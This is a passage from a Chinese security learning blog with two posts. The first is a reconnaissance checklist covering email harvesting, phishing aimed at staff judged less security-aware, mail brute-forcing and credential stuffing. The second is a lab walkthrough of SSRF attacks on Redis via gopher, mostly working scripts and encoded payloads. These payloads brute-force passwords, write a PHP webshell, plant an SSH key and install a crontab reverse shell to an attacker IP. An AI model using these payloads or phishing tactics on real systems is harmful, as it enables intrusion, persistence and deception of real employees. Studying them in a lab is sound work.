目前情况来看，通过web打点不一定是最优的方式，可以社工等方式同步进行；因此尽可能多的收集目标的邮箱，然后进行社工钓鱼可能大有突破 实际过程中，我们可以尽可能的把收集到疑似网络管理员、运维人员、安全部门的人员提取出来，这些人单独写邮件或者不发，因为这些人安全意识相对较高，容易打草惊蛇，我们需要对一些非技术员工安全意识薄弱的人下手，挑软柿子捏。 寻找目标邮箱入口 目标为开放的邮服端口或web邮箱入口 拿到目标后，先要先从MX记录域名找到他的真实ip地址（某些目标可能是第三方邮件服务器，这种情况mx记录就没有参考价值了） 然后针对这个ip地址的C段进行扫描（25、109、110、143、465、995、993端口） 通过子域名 主要是利用一些子域名收集工具，如：Subdomainbrute、ksubdomain、Oneforall、Sublist3r、TeeMO、LangSrcCurise、Layer挖掘机等 通过搜索引擎 1、Google Hacking语法 site:target.com intitle:\"Outlook Web App\" site:target.com intitle:\"mail\" site:target.com intitle:\"邮箱\" 2、网络空间搜索引擎 Shodan fofa zoomeye hostname:163.com http.title:\"邮箱\" 在线平台搜集 邮箱查找工具：https://app.snov.io/ https://phonebook.cz/ ——还可以收集域名与url https://hunter.io/ http://www.skymem.info/ https://www.email-format.com/i/search/ 工具搜集 https://github.com/laramies/theHarvester —kali自带 不理解的是，总是查不出来，感觉是api的问题吧。。。 验证邮箱 在经过上述的邮箱搜集之后，我们可以对邮箱进行存活性验证，检测目标邮箱是否存在被弃用的情况（离职，职位调动等）。 通过mailtester.com ：https://mailtester.com/ 邮箱爆破 这种方式的弱口令爆破只适用于目标企业自己的邮件服务器如owa等 像百度腾讯阿里网易等第三方邮箱不优先考虑 SMTP协议爆破：medusa、hydra、SNETCracker、APT34组织 owa爆破工具等… 网页邮箱爆破：burpsuite等… JS信息搜集 在JS中可能会存在大量的敏感信息，包括但不限于： 某些服务的接口，可以测试这些接口是否有未授权等 子域名，可能包含有不常见或者子域名收集过程中没收集到的目标 密码、secretKey等敏感数据 手工搜集 可以全局搜索http、\"/、这种关键词 利用工具 JSFinder https://github.com/Threezh1/JSFinder JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具用法参考项目文档，或者-h python JSFinder.py -u http://www.jd.com ---简单爬取 LinkFinder https://github.com/GerbenJavado/LinkFinder 这也是一款一直在用的工具，效果杠杠的，可以本地用，也可以集成到Burp插件里面 Hae https://github.com/gh0stkey/HaE HaE是基于 BurpSuite 插件 JavaAPI 开发的请求高亮标记与信息提取的辅助型插件。基于正则表达式，除了提取敏感信息，也可以提取页面中的链接等 贴个图： 社会工程学 社会工程学收集的信息有很多，包含网络 ID（现用和曾用）、真实姓名、手机号、电子邮箱、出生日期、身份证号、银行卡、支付宝账号、QQ 号、微信号、家庭地址、注册网站（贴吧、微博、人人网等）等信息。 在目标相关网页中可能会存在招聘信息、客服联系等，可以利用招聘或客服聊天的方式进行钓鱼、木马植入等。 搜集到相关的人员信息后可以制作社工字典，有如下在线或本地工具： bugku密码攻击器：https://www.bugku.com/mima/ 白鹿社工字典生成器：https://github.com/z3r023/BaiLu-SED-Tool 还有一些社工机器人： 狗狗免费社工机器人 DATA007 平安社工库 AISGK：数据相对比较全，但是需要推广一定人才能用！ 社工密码生成：https://github.com/zgjx6/SocialEngineeringDictionaryGenerator 目标域名邮箱收集 一定要养成收集站点邮箱账号收集的习惯（因为好多官方后台都是用内部邮箱账号登录的，指不定哪天你就得到一个进后台的机会）。 （1）通过说明文档以及网站页面收集，或者网站发表者以及留言板信息处收集账号 （2）通过 teemo，metago，burpusit，awvs，netspker 或者 google 语法收集 （3）搜索相关 QQ 群收集相关企业员工的社交账号 用途： 可用来进行爆破或者弱口令登录以及撞裤攻击。 0x04 外网打点基本流程 经过以上的学习，接下来跟着文章梳理一遍打点的流程 Step One 主域名收集 先收集目标的各种主域名（包括子公司、app、小程序、公众号等） 工具：备案反查域名(icp_domans等)、企查查、… 收集子域名 配置好api的oneforall 、masscan、fscan等等工具，获得比较全的子域名 获取真实IP与C段 对于子域名，获取其真实ip和C段 （C段量大、比较分散的话，可以放到后面再看） 可能很大一部分ip是CDN，快速过滤掉CDN ip,以及做一些简单的绕过（时间充足的话，对重点域名详细绕过，寻找真实ip) 工具： Eeyes（快速筛选真实IP并整理为C段,网络条件好的话，准确率挺高的） fcdn https://github.com/ccc-f/FCDN https://github.com/mabangde/cdncheck_cn 国外可以使用cdncheck：（可检测CDN、WAF、云，国内基本没啥用） type ip.txt | cdncheck.exe -resp -cdn (再过滤一遍Eeyes输出的真实ip结果) 获取对应的资产 获取ip和C段信息对应的资产 通过fofa等快速获取ip和C段信息对应的资产 (相关工具：https://github.com/zhizhuoshuma/Assetstocollect ) 再通过fofa语法搜一遍主域对应的资产信息： domain=\"xxx.com\" 时间充足的话，对ip和C段信息进行全端口扫描，获取更多资产 子域名探活 对子域名进行探活，获取web资产信息 httpx 等，可以增加一下常用的端口 探活有时候不太准确，漏掉一些，可以将所有子域前面增加`http://` `https://` 进行一遍识别 探活可以跟指纹识别一起进行 整理资产，指纹识别 整合所有web资产，进行指纹识别 通过子域名获得的web资产 + fofa ip/C段(ip=\"1.1.1.1\" or ip=\"1.1.1.1/24\") + fofa domain=\"xxx.com\"等等 获得的web资产进行整合 整合后通过 ehole(扩充指纹) 等，进行指纹识别 云溪、wappalyzergo、tidefinger （只能单个url） web资产漏扫 根据目标的防护情况，选择漏扫工具： 快速：fscan 完备： 1、nuclei 整合POC： 自带 整合一些其他的 爬虫(katana等）+fuzzing-templates（https://github.com/projectdiscovery/fuzzing- templates） or https://github.com/0xKayala/NucleiFuzzer 2、afrog (1000个左右poc) 3、爬虫+xray 补充： vscan、sweetbaby IP和C段的高危端口利用 一些非web端口，如ftp ssh 各种数据库 rdp 之类的 弱口令、历史漏洞 web资产目录扫描 dirsearch ，可以先只扫200，可以在前面就先挂上 备份文件扫描（主要针对一些自建的站） 针对重点资产，手工测试的时候再进行深入扫描 敏感Web资产，深入挖掘 登录/注册/敏感框架、组件、服务等： i)指纹识别和POC可能不够完备，针对一些产品，手工识别并找一些历史漏洞测试 ii)重点关注 反序列化、文件上传、SQL注入 漏洞，详细挖掘一下 iii) 登录点爆破，可以收集目标邮箱和社工字典 iv)根据目录扫描结果，对有东西的站深入看一下 v)有充足时间，可以像挖SRC一样对一些站深入挖掘一下。（urlfiner、js接口、爬虫的敏感链接之类。） 测试时，burp插件安装完备(strut2、shiro、fastjson、log4j2、spring、SQL注入相关等)都打开， 同时，有条件可以挂着xray被动(xray可以只用来测sql注入) java站基本是strut2和spring 二选一，有时间都打一遍poc，同时要注意log4j2漏洞一定要测一下 （工具：SpringBoot-Scan-2.03、Spring_All_Reachable、struts2_19.jar） (log4j2一般使用burp插件:https://github.com/whwlsfb/Log4j2Scan) 工具： 智能 Web后台密码爆破工具 https://github.com/Fly-Playgroud/Boom 可以批量爆破web后台 小tips：备份文件扫描可以提前 i)对一些自建站点，可以进行备份文件扫描，找到备份文件，审源码 ii)通过google、github、fofa ico/证书/关键字/title=\"单位名\"等，收集更多资产或者泄露信息 iii)对于一些小众产品，可以通过fofa等，找其他人使用的，可能在用低版本或者有备份文件，拿到源码去审 计 app、小程序、公众号 对发现的app、小程序、公众号进行进一步的探测，类比web探测进行 Step Second 收集目标 上下游公司、供应链、IDC、IDC代理商等信息，重复第一轮的步骤。 用收集到的邮箱再去反查一波，就能找到一部分了，然后去相关备案网站再找一部分，剩下的就是通过爬取相关新闻、超链接、年报，从里面找跟他业务相关的公司 0x05 后记 这几天忙得要死来不及学习。今天大概学习完了，回顾之前的学习历程，感觉是有点抽象的，毕竟感觉在纸上谈兵，学的有点没激情，但这却是后面进一步深入的基础，必须啃下来。 经过上述的学习，对渗透测试以及打点流程有了认识，但日后能实施于实践才算成功，只能说任重道远。总的来说对于上述的流程是有认识了，但对于工具和平台等的使用还是有点懵的，被强行喂了一通知识，但却没有好好消化，因此在今后应该多实战熟悉工具的利用，进一步熟悉渗透测试流程（水很深啊~~~） 之后在看一看st3pby师傅给的实战打点文章，看看佬们的骚操作。本篇文章日后肯定也会更新的（毕竟质量有点差）希望不断完善，形成一个优美的信息搜集知识库！ 0x06 参考文章 Web安全渗透测试基本流程 d4m1ts 知识库 干货 | 最全Web 渗透测试信息搜集-CheckList 全流程信息收集方法总结 DNS篇之dig使用详解 ——很详细 dig命令的介绍与使用 DNS服务系列之一：泛域名解析的安全案例 nslookup命令详解：nslookup是一种网络管理命令行工具","tags":["内网渗透"],"categories":["内网渗透"]},{"title":"ssrf打redis","path":"/2023/12/27/ssrf-da-redis/","content":"0x01 SSRF介绍 SSRF，服务器端请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。今天学习一手redis中如何利用SSRF，感觉这个在实战中不怎么常见，但其中的知识值得学习 0x02 环境搭建 这里在又是废了一天搭建成功，建议大家还是直接下载redis-server服务搭建比较好，网上的教程属实是有点垃圾且害人 这里我的版本的ubuntu22.04 LTS 安装Redis： apt-get install redis-server 修改Redis配置文件（设置密码，监听ip等）： vim /etc/redis/redis.conf 配置监听ip： bind 127.0.0.1 ::1#只监听本地端口，如果需要远程登录可以在后面加上本机的ip，同时远程登录也可能造成未授权访问。 配置默认密码： #requirepass foobared#默认无密码，要设置密码可以将前面的#删除，然后将foobared改为要设置的密码。 启动Redis： /bin/redis-server /etc/redis/redis.conf 或者 service redis-server start#这种方法启动可能会造成Redis在web目录、计划任务目录、.ssh目录等其他一些目录没有写入的权限，就算是root身份启动，文件夹777权限也不行（就很迷）。如果遇到Redis在执行save时报错，就还是试试root身份第一种方法启动吧。 第二天了，你没猜错，这玩意儿tm又废了我一天时间搭建，最终还是选择centos7搭建成功 具体可以参考：Redis环境搭建、CentOS7 搭建php环境 –只需要将其中的php、apache服务安装好即可，最后记得在防火墙开启所需要的端口。其中ssrf.php代码如下： &lt;?php highlight_file(__FILE__); $ch = curl_init(); //创建新的 cURL 资源 curl_setopt($ch, CURLOPT_URL, $_GET['url']); //设置URL 和相应的选项 # curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); # curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_exec($ch); //抓取 URL 内容并把它传递给浏览器，存储进文件 curl_close($ch); //关闭 cURL 资源，并且释放系统资源 ?&gt; 测试没毛病。 0x03 前置知识 这里看到师傅们在探讨这一问题的时候需要学习一手RESP协议，那我们跟着师傅学一手 RESP协议 Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。 RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。 RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。 RESP在Redis中用作请求 - 响应协议的方式如下： 客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。 服务器根据命令实现回复一种RESP类型。 在RESP中，某些数据的类型取决于第一个字节： 对于`Simple Strings`，回复的第一个字节是`+` 对于`error`，回复的第一个字节是`-` 对于`Integer`，回复的第一个字节是`:` 对于`Bulk Strings`，回复的第一个字节是`$` 对于`array`，回复的第一个字节是`*` 此外，`RESP`能够使用稍后指定的`Bulk Strings`或`Array`的特殊变体来表示`Null`值。 在RESP中，协议的不同部分始终以\"\\r \"(CRLF)结束。 我们用tcpdump来抓个客户端与redis服务器通信的包来分析一下 命令：tcpdump -i lo -s 0 port 6379 -w redis.pcap 参数说明： -i指定网卡（一般指定eth0，这里抓取本地接口的流量需要指定为lo） -s抓取数据包时默认抓取长度为68字节。加上-s 0 后可以抓到完整的数据包 port指定抓取的端口 -w保存到文件，后接保存的路径与文件名 这里本地先开启监听，之后进入redis服务器redis-cli -h 127.0.0.1 -p 6379 之后在redis服务器执行如下命令 127.0.0.1:6379&gt; set key1 value1 OK 127.0.0.1:6379&gt; quit 最后将产生的pcap数据包传入wireshark追踪tcp数据流 这里对于该工具的使用方法几乎不懂，但好在找到了目标数据，如上图所示 抓到的数据包如下，结合我们上面对RESP协议的解释，我们来逐行分析: *3：代表数组，也就是这个数组长度为3，set、key1、value1可以将之间的空格认为是分隔符 $3：代表批量字符串，长度为3：set；之后的$4、$6同理 最后的+OK：代表简单字符串 其中set代表设置key，key为key1，对应的value为value1 最后的+OK代表服务端执行成功后返回的字符串 hex转储看一下 正如前面所说的，客户端向将命令作为Bulk Strings的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。 这里的0d0a代表CRLF也就是回车换行符，在这里代表结束符。那有趣的来了，如果我们将上述的数据进行url编码随后在本机127.0.0.1中通过curl和gopher发送给redis服务器会如何呢？ *3 $3 set $4 key1 $6 value1 经过url编码后：注意这里的%0A需要换成%0D0A %2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A 再接着 gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A 如上图可以看到左侧的OK代表我们执行成功，右图是我们登录redis服务器之后验证key1的值是否被设置了 这里看到师傅还尝试直接使用命令发送，而不采取tcp数据流了。我们也尝试一下 命令： set key2 value2 get key2 url编码后： gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A 如上图，看到成功返回了我们刚刚设置的key的值，说明直接发送命令的方法也是可行的。知道了如何让Redis服务器执行我们的命令，那么接下来我们就来看如何攻击来达到 getshell 的目的。 0x04 Redis配合gopher协议进行SSRF 概述 gopher协议是http协议出现之前，在internet中常见的一个协议，但现在这个协议用的越来越少了，但该协议在ssrf中却大有用途，可以用来攻击redis、ftp等，还可以发送get、post请求，这在ssrf攻击中大有作为。 利用条件 redis所在的服务端存在未授权访问或者通过弱口令可以访问到 利用 redis常见的SSRF攻击方式大概有这几种： redis认证攻击 绝对路径写webshell 写ssh公钥 写contrab计划任务反弹shell 下面我们逐个实现 redis认证攻击 这里呢也是可以分为两种情况的，一种是遇到默认无密码的redis服务器，另一种就是有密码的。 无密码Redis攻击 先考虑无密码的，这里呢其实也就是我们上述0x03中介绍过的可以直接构造恶意的明文命令，或者tcp数据流，发送给redis服务器 但这里呢如果对方的redis服务暴露在公网，这就好办了，直接curl发送gopher协议即可。 但如果对方redis限制只监听本地请求，那我们就只能祈祷对方服务器存在ssrf，接下来对于无密码的我就直接cv上面的了。 如果我们将上述的数据进行url编码随后在本机127.0.0.1中通过curl和gopher发送给redis服务器会如何呢？ *3 $3 set $4 key1 $6 value1 经过url编码后：注意这里的%0A需要换成%0D0A %2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A 再接着 gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A 如上图可以看到左侧的OK代表我们执行成功，右图是我们登录redis服务器之后验证key1的值是否被设置了 这里看到师傅还尝试直接使用命令发送，而不采取tcp数据流了。我们也尝试一下 命令： set key2 value2 get key2 url编码后： gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A 如上图，看到成功返回了我们刚刚设置的key的值，说明直接发送命令的方法也是可行的。知道了如何让Redis服务器执行我们的命令，那么接下来我们就来看如何攻击来达到 getshell 的目的。 有密码Redis攻击 这里我们先确定一个登录认证密码，修改redis下的配置文件 redis.conf，搜索 requirepass 关键字。 vim /etc/redis/redis.conf，如下图将#去掉，并在requirepass后面添加密码 退出后重新启动redis服务，接着我们开始爆破。 对于这种需要密码登录认证的，我们可以尝试弱密码，但手动太麻烦，这里我就跟师傅学着写个脚本 import requests target = \"http://192.168.246.138/ssrf.php?url=\" # 请输入目标url rhost = \"127.0.0.1\" rport = \"6379\" with open(\"password.txt\",\"r+\") as file: passwds = file.readlines() for passwd in passwds: passwd = passwd.strip(\" \") len_pass = len(passwd) payload = r\"gopher://\" + rhost + \":\" + rport + \"/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524\"+str(len_pass)+r\"%250d%250a\"+passwd+r\"%250D%250A%252A1%250D%250A\" url = target+str(payload) text = requests.get(url).text if \"OK\" in text: print(\"[+] 爆破成功 密码为: \" + passwd) print(text + payload) break 上图为简单的字典，如下图可以看到最后停在了hybcx这里，说明密码为hybcx 如下图检验成功 绝对路径写webshell 据说这个方法是最常用的 构造payload 先构造redis命令 flushall #删除redis数据库中所有的key set 1 '&lt;?php eval($_GET[\"cmd\"]);?&gt;' #设置键1，值为一句话木马 config set dir /var/www/html #设置redis数据库文件存储位置，这里设置为了web目录 #设置数据库文件名为shell.php，这里是指示redis在下一次保存其数据库时存储为 web目录/shell.php config set dbfilename shell.php save\t#这个命令告诉Redis立即同步保存数据到磁盘上的数据库文件 这里的目的就是向对方服务器的web目录写入一句话木马。这里师傅自己写了个转化为redis RESP协议格式的脚本，这里我直接cv了（我是大彩笔~~） import urllib protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"6379\" shell=\" &lt;?php eval($_GET[\\\"cmd\\\"]);?&gt; \" filename=\"shell.php\" path=\"/var/www/html\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r \" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print(payload) 得到的payload如下，不过下面只进行了一次url编码，而如果我们利用的是ssrf的话，一般就要编码两次 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D% 0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A //二次编码后 gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%2 53Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250A dir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A 最后在ssrf.php发送上述payload即可 服务端看到木马成功写入，下图验证成功 在这里推荐一个工具，虽然之前的文章gopherus工具就可以打redis，不过感觉这个更专业 gopher-redis-auth py2环境下运行，得到的内容记得二次编码发送 依旧成功写入 写ssh公钥 如果.ssh目录存在，则直接写入~/.ssh/authorized_keys；如果不存在，则可以利用crontab创建该目录 不过需要注意，这种方法需要确保靶机允许使用密钥登录。 开启方法：需要修改 ssh 配置文件 /etc/ssh/sshd_config #StrictModes yes 改为 StrictModes no 然后重启sshd即可 /bin/systemctl restart sshd.service 我们先直接尝试ssh登录靶机试试： 可以看到是需要登录密码的，那我们开始攻击 生成攻击机公钥 这里呢我对公钥私钥的原理什么的忘记了，具体原理我认为可以参考：SSH 的原理与应用 其中对咱们这次的攻击思路有帮助的是 使用密码登录，每次都必须输入密码，非常麻烦。好在SSH还提供了公钥登录，可以省去输入密码的步骤。 所谓\"公钥登录\"，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。 这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用ssh-keygen生成一个： $ ssh-keygen 运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。 运行结束以后，在~/.ssh/目录下，会新生成两个文件：id_rsa.pub和id_rsa。前者是公钥，后者是私钥。 这也就是说我们可以想办法将自己攻击机的公钥发送到对方服务器上，这样我们以后对其请求远程连接的时候就没必要输入密码了。 ssh-keygen -t rsa 这里一路回车即可，最后进入/root/.ssh目录下即可看到公钥和私钥，如下图，前者为私钥，后者为公钥 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali 最后我们修改一下上述脚本 import urllib protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"6379\" shell=\" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali \" filename=\"authorized_keys\" path=\"/root/.ssh/\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r \" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print urllib.quote(payload) //二次编码的结果 gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524566%250D%250A%250A%250Assh-rs a%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8%252BFZ3tPB8iivCWMCVFAAby4gH7GvL%252BDYQnOMQXsIbC3xrqQ%252BC6O/4T4VZey1e2JQ00O7%252B8Kl2gWuIkPyXK KTXm88LOfYcARETlr20%252BINfJuzcb6ui1ZF%252BQnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY%252BPV3d zqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg%252BjmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4Te GdbRaAcTuTkVLzBgJXDCA5n2hM%253D%2520root%2540kali%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%25 0D%250A/root/.ssh/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A 成功写入，接下来我们远程连接看看 成功实现免密登录 利用contrab计划任务反弹shell 这个方法只能Centos上使用，Ubuntu上行不通，原因如下： 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件/var/spool/cron/crontabs/&lt;username&gt;权限必须是600也就是-rw-------才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件/var/spool/cron/&lt;username&gt;权限644也能执行 因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错 由于系统的不同，crontrab定时文件位置也会不同 Centos的定时任务文件在`/var/spool/cron/&lt;username&gt;` Ubuntu定时任务文件在`/var/spool/cron/crontabs/&lt;username&gt;` Centos和Ubuntu均存在的（需要root权限）/etc/crontab PS：高版本的redis默认启动是redis权限，故写这个文件是行不通的 构造payload 这里我再复习一波bash反弹命令的原理吧： /bin/bash -i &gt;&amp; /dev/tcp/[ip]/[端口] 0&gt;&amp;1 /bin/bash -i 表示的是调用bash命令的交互模式，并将交互模式重定向到 /dev/tcp/[ip]/[端口] 中。这里我们将ip和端口改为我们攻击机的地址和监听端口。 重定向时加入一个描述符 &amp;，表示直接作为数据流输入。不加 &amp; 时，重定向默认是输出到文件里的。 /dev/tcp/ip地址/端口号 是linux下的特殊文件，表示对这个地址端口进行tcp连接 这里我们设置成攻击机监听的地址 最后面的 0&gt;&amp;1 。此时攻击机和靶机已经建立好了连接，当攻击机进行输入时，就是这里的 0（标准输入） 通过重定向符，重定向到 1（标准输出）中，由于是作为 /bin/bash 的标准输入，所以就执行了系统命令了。 接下来开始写入定时任务，构造redis的命令如下： flushall set 1 ' */1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1 ' config set dir /var/spool/cron/ config set dbfilename root save 转化为redis RESP协议的格式，修改上述脚本即可 import urllib protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"6379\" shell=\" */1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1 \" filename=\"root\" path=\"/var/spool/cron\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r \" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print urllib.quote(payload) 二次编码后的结果如下 gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252461%250D%250A%250A%250A%252A/1 %2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.246.130/5555%25200%253E%25261%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D %250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A/var/spool/cron%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A 发送后，看一下靶机是否被成功写入 接着攻击机开启监听，等一会儿即可。如下图成功拿到shell 不过这里也可以用我推荐过的工具 他这里默认监听端口为1234，需要注意一下，同样二次编码后看靶机，如下图成功写入 成功那shell，不过这里这个工具是sh反弹，暂时也不知道这两种方式有何区别 0x05 